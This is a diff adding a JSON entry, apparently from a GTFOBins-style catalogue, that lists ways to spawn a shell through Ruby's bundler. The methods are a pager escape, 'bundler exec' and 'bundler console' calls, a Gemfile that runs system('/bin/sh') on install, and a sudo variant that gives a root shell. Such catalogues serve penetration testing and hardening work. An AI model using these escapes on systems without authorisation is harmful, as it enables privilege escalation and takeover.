@@ -1,0 +1,29 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "This invokes the default pager, which is likely to be 'less', other functions may apply.",
+        "code": "bundler help\n!/bin/sh\n"
+      },
+      {
+        "code": "export BUNDLE_GEMFILE=x\nbundler exec /bin/sh\n"
+      },
+      {
+        "code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh\n"
+      },
+      {
+        "description": "This spawns an interactive shell via 'irb'.",
+        "code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler console\nsystem('/bin/sh -c /bin/sh')\n"
+      },
+      {
+        "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundler install\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "This invokes the default pager, which is likely to be  'less', other functions may apply.",
+        "code": "sudo bundler help\n!/bin/sh\n"
+      }
+    ]
+  }
+}
